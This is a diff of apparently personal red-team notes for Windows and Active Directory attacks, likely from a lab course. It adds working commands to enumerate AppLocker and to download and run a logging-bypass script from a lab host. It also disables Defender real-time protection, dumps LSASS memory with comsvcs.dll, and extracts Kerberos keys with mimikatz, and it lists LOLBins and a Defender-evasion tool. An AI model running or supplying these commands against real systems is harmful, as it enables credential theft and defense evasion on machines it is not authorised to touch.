@@ -144,6 +144,7 @@ gpresult /h gp.html  => search in there?
 
 {% code overflow="wrap" %}
 ```powershell
+Get-AppLockerPolicy -Effective 
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
@@ -153,14 +154,37 @@ reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\....
 
 **Bypasses Enhanced Script Block Logging**
 
-```powershell
-iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
+<pre class="language-powershell"><code class="lang-powershell">iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
 
 or paste the content of sbloggingbypass.txt
+<strong>
+</strong></code></pre>
 
+**Bypass Device Guard**
+
+* If possible deactivate Defender first - dmp will be otherwise deleted
+* Find Device Guard configuration
+
+{% code overflow="wrap" %}
+```powershell
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
 ```
+{% endcode %}
 
+* Dump Lsass with comsvcs.dll
 
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Disable defender: “Set-MpPreference -DisableRealtimeMonitoring $true”
+</strong><strong>tasklist /FI "IMAGENAME eq lsass.exe"
+</strong>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PIDHere] C:\Users\Public\lsass.dmp full
+Copy file to localhost: echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
+Start local mimikatz
+sekurlsa::minidump C:\AD\Tools\lsass.DMP
+privilege::debug
+sekurlsa::ekeys
+</code></pre>
+
+* Dump lsass with taskmanager if we have rdp accesss
+* Use other Lolbins // msbuild, rundll32, regsvc
 
 **Identify Code/Strings Defender may flag**\
 https://github.com/matterpreter/DefenderCheck => C# without builds\
